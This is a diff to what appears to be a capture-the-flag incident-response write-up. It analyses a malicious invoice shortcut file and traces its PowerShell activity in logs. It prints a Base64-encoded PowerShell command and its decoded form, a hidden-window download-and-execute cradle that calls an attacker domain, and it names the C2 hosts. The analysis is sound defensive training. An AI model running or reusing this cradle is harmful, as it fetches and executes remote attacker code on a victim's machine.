@@ -47,17 +47,17 @@ The attachment was extracted using Thunderbird, revealing an additional file nam
 
 After extracting the .lnk file, LnkParse was used to analyze the shortcut and identify embedded command-line arguments:
 
-**lnkparse Invoice_20230103.lnk**
+``lnkparse Invoice_20230103.lnk``
 
 Analysis of the LnkParse output revealed a suspicious command containing a Base64-encoded PowerShell payload. The presence of PowerShell execution with a hidden window and an encoded command is consistent with techniques commonly used to obfuscate malicious activity.
 
 Observed command:
 
-**nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==**
+```nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==```
 
 The encoded argument was decoded using CyberChef's Base64 decoder, followed by removal of the embedded null bytes. This produced the following PowerShell command:
 
-**-nop -windowstyle hidden iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')**
+```-nop -windowstyle hidden iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')```
 
 **Findings**
 
@@ -86,7 +86,12 @@ Our supervisor has given us an helpful investigative guide to follow for task 2.
 
 We will use jq to parse and analyze the PowerShell.json artifact that we are provided. 
 
-First thought process is to look for the suspicious domain found when we decoded the base64 command in task 1. To accomplish this, I used the following command: *cat powershell.json | jq | grep -i bpakcaging.xyz* 
+First thought process is to look for the suspicious domain found when we decoded the base64 command in task 1. To accomplish this, I used the following command: ```cat powershell.json | jq | grep -i bpakcaging.xyz```. This will simplify results to what we actually want to see, without the grep command, the noise may be too much to sift through comfortably. 
+
+**Findings**
+- The attacker reaches out to two likely Command and Control (C2) Servers: *cdn.bpakcaging.xyz && files.bpakcaging.xyz*.
+
+Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. 
 
 
 
